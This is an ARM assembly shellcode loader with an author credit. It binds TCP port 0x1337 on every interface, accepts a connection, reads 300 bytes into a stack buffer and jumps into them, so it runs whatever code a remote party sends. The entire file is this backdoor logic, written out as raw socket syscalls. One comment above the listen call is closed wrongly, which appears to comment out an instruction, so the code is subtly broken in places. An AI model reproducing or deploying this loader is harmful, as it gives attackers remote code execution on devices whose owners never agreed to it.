/*
 * Title: arm-loader
 * Brief: Bind port 0x1337 on any local interface, listen for a connection
 *        receive a payload, and pass execution to it
 * Author: Daniel Godas-Lopez <gmail account dgodas>
 */

	/*
	  soc_des = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	 */

	mov %r0, $2		/* AF_INET */
	mov %r1, $1		/* SOCK_STREAM */
	mov %r2, $6		/* IPPRTOTO_TCP */
	push {%r0, %r1, %r2}
	mov %r0, $1		/* socket */
	mov %r1, %sp
	svc 0x00900066
	add %sp, %sp, $12

	mov %r6, %r0		/* r6 = soc_des */

	/*
	  bind(soc_des, (struct sockaddr *) &serv_addr, sizeof(serv_addr));
	 */

.if 0 /* r0 == r6 already */
	mov %r0, %r6		/* soc_des */
.endif

	mov %r1, $0x37
	mov %r7, $0x13
	mov %r1, %r1, lsl $24
	add %r1, %r7, lsl $16
	add %r1, $2		/* port = 0x1337, family = 2 (AF_INET) */
	sub %r2, %r2, %r2	/* addr = 0.0.0.0 */
	push {%r1, %r2}
	mov %r1, %sp		/* pointer to sockaddr_in */
	mov %r2, $16		/* sizeof(struct sockaddr_in) */

	push {%r0, %r1, %r2}
	mov %r0, $2		/* bind */
	mov %r1, %sp
	svc 0x00900066
	add %sp, %sp, $20

	/*
	  listen(soc_des, 1);
	 /*

	mov %r1, $1		/* backlog (see man 2 listen) */
	mov %r0, %r6		/* soc_des */
	push {%r0, %r1}
	mov %r0, $4		/* listen */
	mov %r1, %sp
	svc 0x00900066
	add %sp, $8

	/*
	  soc_cli = accept(soc_des, 0, 0);
	 */

	mov %r0, %r6		/* soc_des */
	sub %r1, %r1, %r1
	sub %r2, %r2, %r2
	push {%r0, %r1, %r2}
	mov %r0, $5		/* accept */
	mov %r1, %sp
	svc 0x00900066
	add %sp, %sp, $12

	mov %r6, %r0		/* r6 = soc_cli */

	/*
	  recv(soc_des, buff, len, flags);
	 */

	sub %r4, %sp, $316	/* buffer on the stack + 16 bytes padding */
	sub %r5, %r5, %r5	/* byte count */

1:	mov %r0, %r6
	add %r1, %r4, %r5	/* dst pointer */
	mov %r2, $300		/* 300 bytes */
	mov %r3, $256		/* MSG_WAITALL */
	push {%r0, %r1, %r2, %r3}

	mov %r0, $10		/* recv */
	mov %r1, %sp
	svc 0x00900066
	add %sp, %sp, $16
	add %r5, %r0
	cmp %r5, $300
	bne 1b

	/*
	  Jump into code
	 */

	mov %pc, %r4